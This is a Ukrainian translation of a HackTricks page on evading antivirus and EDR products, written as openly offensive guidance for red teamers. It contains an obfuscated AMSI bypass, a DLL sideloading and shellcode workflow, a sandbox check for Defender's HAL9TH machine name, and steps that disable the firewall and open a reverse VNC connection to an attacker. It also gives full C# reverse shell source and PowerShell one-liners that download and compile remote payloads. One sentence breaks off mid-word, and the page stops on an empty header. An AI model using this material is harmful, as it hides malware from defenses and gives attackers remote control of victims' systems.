# Ухилення від антивірусів (AV)

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію в рекламі HackTricks** або **завантажити HackTricks у PDF** Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Дізнайтеся про [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакінг-трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв GitHub.

</details>

**Цю сторінку написав** [**@m2rc\_p**](https://twitter.com/m2rc\_p)**!**

## **Методологія ухилення від AV**

Наразі AV використовують різні методи для перевірки, чи є файл шкідливим, чи ні: статичний аналіз, динамічний аналіз та для більш розширених EDR - поведінковий аналіз.

### **Статичний аналіз**

Статичний аналіз досягається шляхом позначення відомих шкідливих рядків або масивів байтів у бінарному або скриптовому файлі, а також витягування інформації з самого файлу (наприклад, опис файлу, назва компанії, цифрові підписи, значок, контрольна сума тощо). Це означає, що використання відомих загальнодоступних інструментів може призвести до швидшого виявлення, оскільки їх, ймовірно, вже проаналізовано і позначено як шкідливі. Є кілька способів обійти цей вид виявлення:

* **Шифрування**

Якщо ви зашифруєте бінарний файл, AV не зможе виявити вашу програму, але вам знадобиться якийсь завантажувач для розшифрування та запуску програми в пам'яті.

* **Обфускація**

Іноді все, що вам потрібно зробити, це змінити деякі рядки у вашому бінарному файлі або скрипті, щоб пройти мимо AV, але це може бути часомірним завданням, залежно від того, що ви намагаєтеся обфускувати.

* **Індивідуальні інструменти**

Якщо ви розробляєте власні інструменти, не буде відомих поганих підписів, але це потребує багато часу та зусиль.

{% hint style="info" %}
Добрий спосіб перевірити статичний виявлення Windows Defender - [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Він в основному розбиває файл на кілька сегментів, а потім вимагає від Defender просканувати кожен з них окремо, таким чином, він може точно сказати, які рядки або байти позначені у вашому бінарному файлі.
{% endhint %}

Дуже рекомендую переглянути цей [плейлист на YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf) про практичне ухилення від AV.

### **Динамічний аналіз**

Динамічний аналіз полягає в тому, що AV запускає ваш бінарний файл у пісочниці та спостерігає за шкідливою діяльністю (наприклад, спроба розшифрувати та прочитати паролі вашого браузера, виконання мінідампу на LSASS тощо). Ця частина може бути трохи складнішою для роботи, але ось деякі речі, які ви можете зробити для ухилення від пісочниць.

* **Сон перед виконанням** Залежно від того, як це реалізовано, це може бути чудовим способом обійти динамічний аналіз AV. У AV дуже мало часу для сканування файлів, щоб не переривати роботу користувача, тому використання тривалих перерв може заважати аналізу бінарних файлів. Проблема полягає в тому, що багато пісочниць AV можуть просто пропустити перерву, залежно від того, як вона реалізована.
* **Перевірка ресурсів машини** Зазвичай у пісочницях дуже мало ресурсів для роботи (наприклад, < 2 ГБ ОЗП), інакше вони можуть сповільнити роботу машини користувача. Тут ви також можете бути дуже креативними, наприклад, перевіряючи температуру процесора або навіть швидкість обертання вентилятора, не все буде реалізовано в пісочниці.
* **Перевірки, специфічні для машини** Якщо ви хочете націлитися на користувача, чиє робоче місце приєднане до домену "contoso.local", ви можете перевірити домен комп'ютера, щоб переконатися, чи він відповідає тому, який ви вказали, якщо ні, ви можете вимагати виходу з програми.

Виявилося, що комп'ютер в пісочниці Microsoft Defender має ім'я HAL9TH, тому ви можете перевірити ім'я комп'ютера у своєму шкідливому програмному забезпеченні перед детонацією, якщо ім'я відповідає HAL9TH, це означає, що ви знаходитесь у пісочниці захисника, тому ви можете вимагати виходу з програми.

<figure><img src="../.gitbook/assets/image (3) (6).png" alt=""><figcaption><p>джерело: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Деякі інші дуже корисні поради від [@mgeeky](https://twitter.com/mariuszbit) для протистояння пісочницям

<figure><img src="../.gitbook/assets/image (2) (1) (1) (2) (1).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Як ми вже говорили у цьому пості, **відкриті інструменти** врешті-решт **будуть виявлені**, тому вам слід задати собі питання:

Наприклад, якщо ви хочете витягнути LSASS, **чи вам дійсно потрібно використовувати mimikatz**? Або ви можете використати інший проект, який менш відомий і також витягує LSASS.

Правильна відповідь, ймовірно, полягає в останньому. Беручи mimikatz як приклад, це, ймовірно, один з найбільш позначених шкідливих програм AV та EDR, хоча сам проект дуже крутий, з ним також важко працювати, щоб обійти AV, тому просто шукайте альтернативи для досягнення своєї мети.

{% hint style="info" %}
При модифікації ваших навантажень для ухилення, переконайтеся, що **вимкнено автоматичне надсилання зразків** в захиснику, і, будь ласка, серйозно, **НЕ ЗАВАНТАЖУЙТЕ НА VIRUSTOTAL**, якщо ваша мета - досягнення ухилення в довгостроковій перспективі. Якщо ви хочете перевірити, чи виявляється ваше навантаження певним AV, встановіть його на віртуальну машину, спробуйте вимкнути автоматичне надсилання зразків та протестуйте там, поки не будете задоволені результатом.
{% endhint %}

## EXE проти DLL

Коли це можливо, завжди **пріоритизуйте використання DLL для ухилення**, на моєму досвіді, файли DLL зазвичай **менше виявляються** та аналізуються, тому це дуже простий трюк для уникнення виявлення у деяких випадках (якщо ваше навантаження має якийсь спосіб запуску як DLL, звичайно).

Як ми можемо побачити на цьому зображенні, навантаження DLL від Havoc має рівень виявлення 4/26 на antiscan.me, тоді як навантаження EXE має рівень виявлення 7/26.

<figure><img src="../.gitbook/assets/image (6) (3) (1).png" alt=""><figcaption><p>порівняння antiscan.me звичайного навантаження EXE Havoc звичайного навантаження DLL Havoc</p></figcaption></figure>

Тепер ми покажемо деякі трюки, які ви можете використовувати з файлами DLL, щоб бути набагато більш прихованими.
## DLL Сайдлоадінг та Проксі

**DLL Сайдлоадінг** використовує порядок пошуку DLL, який використовує завантажувач, розташовуючи як жертву, так і зловмисне навантаження поруч одне з одним.

Ви можете перевірити програми, які піддаються DLL Сайдлоадінгу, використовуючи [Siofra](https://github.com/Cybereason/siofra) та наступний сценарій PowerShell:

{% code overflow="wrap" %}
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
{% endcode %}

Ця команда виведе список програм, які піддаються атакам на використання DLL у "C:\Program Files\\" та DLL-файли, які вони намагаються завантажити.

Я настійно рекомендую **дослідити програми, які піддаються атакам на використання DLL, самостійно**, ця техніка досить хитра, якщо вона виконується належним чином, але якщо ви використовуєте публічно відомі програми, які піддаються атакам на використання DLL, вас можуть легко впіймати.

Просто розмістивши зловмисний DLL з ім'ям, яке програма очікує завантажити, не завантажить ваше навантаження, оскільки програма очікує деякі конкретні функції всередині цього DLL. Для виправлення цієї проблеми ми використаємо іншу техніку, яка називається **проксі-перенаправленням DLL**.

**Проксі-перенаправлення DLL** перенаправляє виклики, які програма робить з проксі (та зловмисного) DLL до оригінального DLL, тим самим зберігаючи функціональність програми та можливість обробки виконання вашого навантаження.

Я буду використовувати проект [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) від [@flangvik](https://twitter.com/Flangvik/)

Ось кроки, які я виконав:

{% code overflow="wrap" %}
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
{% endcode %}

Остання команда надасть нам 2 файли: шаблон вихідного коду DLL та оригінальний перейменований DLL.

<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
{% endcode %}

Ось результати:

<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Як наш шелл-код (закодований за допомогою [SGN](https://github.com/EgeBalci/sgn)) так і проксі-бібліотека мають оцінку виявлення 0/26 в [antiscan.me](https://antiscan.me)! Я б назвав це успіхом.

<figure><img src="../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Я **настійно рекомендую** вам переглянути [twitch VOD від S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) про бічне завантаження DLL та також [відео від ippsec](https://www.youtube.com/watch?v=3eROsG\_WNpE), щоб дізнатися більше про те, про що ми обговорювали більш детально.
{% endhint %}

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze - це набір інструментів для виконання навантаження для обходу EDR за допомогою призупинених процесів, прямих системних викликів та альтернативних методів виконання`

Ви можете використовувати Freeze для завантаження та виконання вашого шелл-коду незамітним способом.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Ухилення - це лише гра в кота та мишу, те, що працює сьогодні, може бути виявлено завтра, тому ніколи не покладайтеся лише на один інструмент, якщо це можливо, спробуйте ланцюжити кілька методів ухилення.
{% endhint %}

## AMSI (Інтерфейс антивірусного сканування)

AMSI був створений для запобігання "[безфайловому шкідливому програмному забезпеченню](https://en.wikipedia.org/wiki/Fileless\_malware)". Спочатку АВ могли сканувати лише **файли на диску**, тому якщо ви якось могли виконати вантажи **прямо в пам'яті**, то АВ не міг би нічого зробити, оскільки не мав достатньої видимості.

Функція AMSI інтегрована в ці компоненти Windows.

* Контроль облікових записів користувачів, або UAC (підвищення EXE, COM, MSI або встановлення ActiveX)
* PowerShell (сценарії, інтерактивне використання та динамічна оцінка коду)
* Windows Script Host (wscript.exe та cscript.exe)
* JavaScript та VBScript
* Макроси Office VBA

Це дозволяє антивірусним рішенням перевіряти поведінку сценаріїв, викриваючи вміст сценарію у формі, яка є як незашифрованою, так і не затемненою.

Виконання `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` призведе до виникнення наступного сповіщення в Windows Defender.

<figure><img src="../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>

Зверніть увагу, як він додає `amsi:` і потім шлях до виконуваного файлу, з якого запущено сценарій, у цьому випадку powershell.exe

Ми не залишили жодного файлу на диску, але все одно були виявлені в пам'яті через AMSI.

Є кілька способів обійти AMSI:

* **Затемнення**

Оскільки AMSI головним чином працює зі статичними виявленнями, тому модифікація сценаріїв, які ви намагаєтеся завантажити, може бути хорошим способом ухилення від виявлення.

Однак AMSI має можливість розшифровувати сценарії навіть якщо вони мають кілька рівнів, тому затемнення може бути поганим варіантом в залежності від того, як це зроблено. Це робить його не таким прямолінійним для ухилення. Хоча іноді все, що вам потрібно зробити, це змінити кілька назв змінних, і ви будете в порядку, тому це залежить від того, наскільки щось було позначено.

* **Обхід AMSI**

Оскільки AMSI реалізований шляхом завантаження DLL у процес powershell (також cscript.exe, wscript.exe та ін.), можливо легко втрутитися в нього навіть при запуску як непривілейований користувач. Через цей недолік у реалізації AMSI дослідники знайшли кілька способів ухилення від сканування AMSI.

**Примусова помилка**

Примусове викликання ініціалізації AMSI на помилку (amsiInitFailed) призведе до того, що для поточного процесу не буде ініційовано жодного сканування. Спочатку це було розкрито [Меттом Грейбером](https://twitter.com/mattifestation), і Microsoft розробила підпис для запобігання широкому використанню.

{% code overflow="wrap" %}
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

Всього один рядок коду PowerShell був достатнім, щоб зробити AMSI непридатним для поточного процесу PowerShell. Цей рядок, звичайно ж, був відзначений самим AMSI, тому потрібно внести деякі зміни, щоб використовувати цю техніку.

Ось модифікований обхід AMSI, який я взяв з цього [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
**Патчування пам'яті**

Цю техніку спочатку відкрив [@RastaMouse](https://twitter.com/\_RastaMouse/), і вона полягає в пошуку адреси функції "AmsiScanBuffer" в amsi.dll (відповідальної за сканування введення, надане користувачем) та перезапису цієї адреси інструкціями для повернення коду для E\_INVALIDARG, таким чином, результат фактичного сканування поверне 0, що інтерпретується як чистий результат.

{% hint style="info" %}
Будь ласка, прочитайте [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) для більш детального пояснення.
{% endhint %}

Існують також інші техніки, які використовуються для обхіду AMSI з використанням powershell, перегляньте [**цю сторінку**](basic-powershell-for-pentesters/#amsi-bypass) та [цей репозиторій](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell), щоб дізнатися більше про них.

Або цей скрипт, який за допомогою патчування пам'яті буде патчувати кожен новий Powersh

## Обфускація

Існує кілька інструментів, які можна використовувати для **обфускації чіткого тексту C# коду**, генерації **шаблонів метапрограмування** для компіляції бінарних файлів або **обфускації скомпільованих бінарних файлів**, таких як:

* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# обфускатор**
* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Мета цього проекту - надати відкриту версію [LLVM](http://www.llvm.org/) компіляційного набору, яка здатна забезпечити підвищену безпеку програмного забезпечення за допомогою [обфускації коду](http://en.wikipedia.org/wiki/Obfuscation\_\(software\)) та захисту від втручання.
* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator показує, як використовувати мову `C++11/14` для генерації, на етапі компіляції, обфускованого коду без використання зовнішніх інструментів та без зміни компілятора.
* [**obfy**](https://github.com/fritzone/obfy): Додає шар обфускованих операцій, згенерованих фреймворком метапрограмування C++, що ускладнить життя особі, яка хоче взламати додаток.
* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz - це x64 бінарний обфускатор, який може обфускувати різні файли pe, включаючи: .exe, .dll, .sys
* [**metame**](https://github.com/a0rtega/metame): Metame - це простий двигун метаморфного коду для довільних виконавчих файлів.
* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator - це фреймворк обфускації коду з дрібними деталями для мов, які підтримуються LLVM, використовуючи ROP (програмування з використанням повернення). ROPfuscator обфускує програму на рівні коду асемблера, перетворюючи звичайні інструкції в ланцюги ROP, перешкоджаючи нашому природному уявленню про нормальний контрольний потік.
* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt - це .NET PE Crypter, написаний на Nim
* [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor може перетворити існуючий EXE/DLL в shellcode, а потім завантажити їх

## SmartScreen & MoTW

Можливо, ви бачили цей екран при завантаженні деяких виконуваних файлів з Інтернету та їх виконанні.

Microsoft Defender SmartScreen - це механізм безпеки, призначений для захисту кінцевого користувача від запуску потенційно шкідливих додатків.

<figure><img src="../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>

SmartScreen в основному працює за підходом на основі репутації, що означає, що незвичайні завантажені програми спричинять спрацювання SmartScreen, що сповістить та запобіжить кінцевому користувачеві виконати файл (хоча файл все одно можна виконати, натиснувши Додаткова інформація -> Все одно виконати).

**MoTW** (Mark of The Web) - це [альтернативний потік даних NTFS](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\)) з назвою Zone.Identifier, який автоматично створюється при завантаженні файлів з Інтернету, разом з URL, з якого вони були завантажені.

<figure><img src="../.gitbook/assets/image (13) (3).png" alt=""><figcaption><p>Перевірка альтернативного потоку даних Zone.Identifier для файлу, завантаженого з Інтернету.</p></figcaption></figure>

{% hint style="info" %}
Важливо зауважити, що виконувані файли, підписані **довіреним** сертифікатом **не спричинять спрацювання SmartScreen**.
{% endhint %}

Дуже ефективним способом запобігти отриманню ваших вантажень від Mark of The Web є упакування їх у який-небудь контейнер, наприклад, ISO. Це трапляється тому, що Mark-of-the-Web (MOTW) **не може** бути застосований до **несистемних NTFS** томів.

<figure><img src="../.gitbook/assets/image (12) (2) (2).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) - це інструмент, який упаковує вантаження в вихідні контейнери для ухилення від Mark-of-the-Web.

Приклад використання:
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
## Відображення зборки C#

Завантаження бінарних файлів C# в пам'ять відомо вже давно і все ще є дуже ефективним способом запуску ваших інструментів після експлуатації без ризику потрапити під приціл Антивірусу.

Оскільки навантаження буде завантажено безпосередньо в пам'ять, не торкаючись диска, нам доведеться турбуватися лише про патчінг AMSI для всього процесу.

Більшість фреймворків C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc тощо) вже надають можливість виконання бінарних файлів C# безпосередньо в пам'ять, але є різні способи цього:

* **Fork\&Run**

Це включає **створення нового жертовного процесу**, впровадження вашого зловмисного коду після експлуатації в цей новий процес, виконання зловмисного коду і після завершення - вбивство нового процесу. Цей метод має як свої переваги, так і недоліки. Перевага методу fork and run полягає в тому, що виконання відбувається **поза** процесом нашої імплантації Beacon. Це означає, що якщо щось піде не так або буде виявлено під час нашої дії після експлуатації, є **набагато більше шансів нашої імплантації вижити.** Недолік полягає в тому, що у вас є **більше шансів** бути виявленим **поведінковими виявленнями**.

* **Inline**

Це полягає в тому, що впроваджується зловмисний код після експлуатації **в свій власний процес**. Таким чином, ви можете уникнути створення нового процесу та сканування його Антивірусом, але недолік полягає в тому, що якщо щось піде не так з виконанням вашого навантаження, є **набагато більше шансів** **втратити вашу маячну вогонь** через можливу аварію.

## Використання інших мов програмування

Як запропоновано в [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), можливо виконати зловмисний код, використовуючи інші мови програмування, надавши компрометованій машині доступ **до середовища інтерпретатора, встановленого на SMB-ресурсі, керованому зловмисником**.

Дозволяючи доступ до бінарних файлів інтерпретатора та середовища на SMB-ресурсі, ви можете **виконувати довільний код на цих мовах програмування в пам'яті** компрометованої машини.

У репозиторії зазначено: Defender все ще сканує скрипти, але використовуючи Go, Java, PHP тощо, ми маємо **більшу гнучкість для обхіду статичних підписів**. Тестування з випадковими необфускованими скриптами обертання обертання на цих мовах було успішним.

## Розширене ухилення

Ухилення - це дуже складна тема, іноді вам доводиться враховувати багато різних джерел телеметрії в одній системі, тому практично неможливо залишитися повністю невиявленим в зрілих середовищах.

У кожному середовищі, з яким ви стикаєтеся, є свої переваги та недоліки.

Я настійно рекомендую вам переглянути цей виступ від [@ATTL4S](https://twitter.com/DaniLJ94), щоб отримати відчуття більш розширених технік ухилення.

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

Також є ще один чудовий виступ від [@mariuszbit](https://twitter.com/mariuszbit) про ухилення в глибину.

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **Старі техніки**

### **Перевірте, які частини Defender вважає зловісними**

Ви можете використовувати [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), який буде **видаляти частини бінарного файлу**, поки не **виявить, яка частина Defender** вважає зловісною і розділить її для вас.\
Інший інструмент, який робить **теж саме**, - [**avred**](https://github.com/dobin/avred) з відкритим веб-сервісом, що пропонує послуги на [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Сервер Telnet**

До Windows10 всі версії Windows постачалися з **сервером Telnet**, який можна було встановити (як адміністратор) за допомогою:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Зробити його **запуском** при запуску системи та **запустити** його зараз:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Змініть порт telnet** (приховано) та вимкніть брандмауер:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Завантажте його з: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (вам потрібні завантаження bin, а не налаштування)

**НА ХОСТІ**: Виконайте _**winvnc.exe**_ та налаштуйте сервер:

* Увімкніть опцію _Disable TrayIcon_
* Встановіть пароль в _VNC Password_
* Встановіть пароль в _View-Only Password_

Потім перемістіть бінарний файл _**winvnc.exe**_ та **новостворений** файл _**UltraVNC.ini**_ всередину **жертви**

#### **Зворотне підключення**

**Атакуючий** повинен **виконати всередині** свого **хоста** бінарний файл `vncviewer.exe -listen 5900`, щоб він був **готовий** для отримання зворотного **VNC підключення**. Потім всередині **жертви**: Запустіть демона winvnc `winvnc.exe -run` та запустіть `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**УВАГА:** Щоб зберегти невидимість, вам необхідно не робити кілька речей

* Не запускайте `winvnc`, якщо він вже працює, або ви викличете [спливаюче вікно](https://i.imgur.com/1SROTTl.png). перевірте, чи він працює за допомогою `tasklist | findstr winvnc`
* Не запускайте `winvnc` без `UltraVNC.ini` в тій самій теки, інакше відкриється [вікно конфігурації](https://i.imgur.com/rfMQWcf.png)
* Не запускайте `winvnc -h` для допомоги, або ви викличете [спливаюче вікно](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Завантажте його з: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Усередині GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Зараз **запустіть прослуховувач** за допомогою `msfconsole -r file.rc` та **виконайте** **xml payload** за допомогою:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Поточний захисник дуже швидко завершить процес.**

### Компіляція нашого власного зворотнього шелу

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Перший C# зворотній шел

Скомпілюйте його за допомогою:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Використовуйте це з:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# використання компілятора
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Автоматичне завантаження та виконання:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

Список обфускаторів C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
* [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
* [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
* [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
* [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
* [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Використання python для створення прикладів ін'єкторів:

